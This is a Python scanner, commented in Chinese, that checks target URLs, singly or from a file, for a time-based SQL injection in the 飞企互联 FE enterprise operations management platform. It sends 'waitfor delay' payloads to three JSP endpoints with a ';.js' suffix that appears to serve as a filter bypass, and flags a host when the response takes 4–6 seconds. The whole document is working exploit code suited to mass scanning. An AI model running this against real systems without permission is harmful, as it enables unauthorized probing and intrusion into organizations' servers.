#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
该脚本用于检测指定URL是否存在飞企互联FE企业运营管理平台的SQL注入漏洞。

通过发送GET请求并测量响应时间来检查漏洞。如果响应时间在特定范围内，则认为可能存在漏洞。
"""
import http.client
import ssl
import argparse
from urllib.parse import urlparse
import time

# 定义颜色常量用于输出提示信息
RED = '\033[91m'
RESET = '\033[0m'

# Function to check vulnerability
def check_vulnerability(url, endpoint):
    """
    检查给定URL是否易受飞企互联FE企业运营管理平台SQL注入漏洞的影响。
    
    参数:
    - url: 要检查的URL。
    - endpoint: 检测用的特定路径/查询字符串。
    """
    try:
        # 解析URL以获取网络位置和路径
        parsed_url = urlparse(url)
        path = parsed_url.path.rstrip('/') + endpoint
    
        # 根据URL的协议选择HTTP或HTTPS连接
        if parsed_url.scheme == "https":
            # 忽略SSL证书验证
            conn = http.client.HTTPSConnection(parsed_url.netloc, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(parsed_url.netloc)
      
        start_time = time.time()
        # 发送GET请求
        conn.request("GET", path)
    
        # 接收响应
        response = conn.getresponse()
  
        elapsed_time = time.time() - start_time
        # 根据响应时间判断是否存在漏洞
        if 4 <= elapsed_time < 6:
            print(f"{RED}URL [{url}] 可能存在飞企互联FE企业运营管理平台 {endpoint} SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except Exception as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    """
    主函数，用于解析命令行参数并执行漏洞检查。
    
    使用argparse库解析命令行参数，支持指定单个URL或包含URLs的文件。
    对每个URL，针对多个endpoint执行漏洞检查。
    """
    parser = argparse.ArgumentParser(description='检测目标地址是否存在飞企互联FE企业运营管理平台 SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    # 定义待检查的endpoint列表
    endpoints = [
        "/common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:4%27--+",
        "/common/efficientCodewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:4%27--+",
        "/docexchangeManage/checkGroupCode.jsp;.js?code=1%27;waitfor+delay+%270:0:4%27--+"
    ]

    # 如果指定了URL参数
    if args.url:
        # 确保URL以http://或https://开头
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        # 对每个endpoint检查漏洞
        for endpoint in endpoints:
            check_vulnerability(args.url, endpoint)
    # 如果指定了文件参数
    elif args.file:
        with open(args.file, 'r') as file:
            # 读取文件中的每个URL并检查漏洞
            urls = file.read().splitlines()
            for url in urls:
                # 确保URL以http://或https://开头
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                for endpoint in endpoints:
                    check_vulnerability(url, endpoint)

if __name__ == '__main__':
    main()
